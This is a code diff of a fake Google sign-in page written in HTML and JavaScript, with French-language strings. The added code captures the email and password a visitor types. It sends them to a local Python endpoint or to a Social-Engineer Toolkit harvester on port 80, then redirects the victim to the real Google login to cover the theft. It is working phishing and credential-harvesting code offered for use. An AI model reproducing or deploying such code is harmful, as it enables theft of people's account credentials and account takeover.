@@ -328,54 +328,81 @@
     const status = document.querySelector("#status");
     const GOOGLE_LOGIN = "https://accounts.google.com/v3/signin/identifier";
 
-    if (PYTHON_MODE) {
-      loginForm.addEventListener("submit", async (event) => {
-        event.preventDefault();
-
-        const email = identifier.value.trim();
-        const motDePasse = password.value.trim();
-
-        if (!email) {
-          identifier.focus();
-          return;
-        }
-
-        if (!motDePasse) {
-          password.focus();
-          return;
-        }
-
-        status.hidden = true;
-        nextButton.disabled = true;
-        nextButton.textContent = "Enregistrement...";
-
-        try {
-          const response = await fetch("/api/enregistrer", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              email,
-              password: motDePasse,
-              date: new Date().toISOString(),
-            }),
-          });
-
-          if (!response.ok) {
-            throw new Error("Erreur serveur");
-          }
-        } catch (error) {
-          status.hidden = false;
-          status.textContent = "Serveur Python indisponible.";
-          nextButton.disabled = false;
-          nextButton.textContent = "Suivant";
-          return;
-        }
-
-        const url = new URL(GOOGLE_LOGIN);
-        url.searchParams.set("Email", email);
-        window.location.href = url.toString();
-      });
+    function redirectToGoogle(email) {
+      const url = new URL(GOOGLE_LOGIN);
+      url.searchParams.set("Email", email);
+      window.location.href = url.toString();
     }
+
+    async function envoyerVersSet(email, motDePasse) {
+      const formData = new FormData();
+      formData.append("username", email);
+      formData.append("password", motDePasse);
+
+      const response = await fetch("/", {
+        method: "POST",
+        body: formData,
+      });
+
+      if (!response.ok) {
+        throw new Error("Erreur SET");
+      }
+    }
+
+    async function envoyerVersPython(email, motDePasse) {
+      const response = await fetch("/api/enregistrer", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          email,
+          password: motDePasse,
+          date: new Date().toISOString(),
+        }),
+      });
+
+      if (!response.ok) {
+        throw new Error("Erreur serveur");
+      }
+    }
+
+    loginForm.addEventListener("submit", async (event) => {
+      event.preventDefault();
+
+      const email = identifier.value.trim();
+      const motDePasse = password.value.trim();
+
+      if (!email) {
+        identifier.focus();
+        return;
+      }
+
+      if (!motDePasse) {
+        password.focus();
+        return;
+      }
+
+      status.hidden = true;
+      nextButton.disabled = true;
+      nextButton.textContent = "Enregistrement...";
+
+      try {
+        if (PYTHON_MODE) {
+          await envoyerVersPython(email, motDePasse);
+        } else {
+          await envoyerVersSet(email, motDePasse);
+        }
+      } catch (error) {
+        status.hidden = false;
+        status.textContent = PYTHON_MODE
+          ? "Serveur Python indisponible."
+          : "Erreur lors de l'envoi. Verifiez que SET tourne sur le port 80.";
+        nextButton.disabled = false;
+        nextButton.textContent = "Suivant";
+        return;
+      }
+
+      redirectToGoogle(email);
+    });
   </script>
 </body>
 </html>
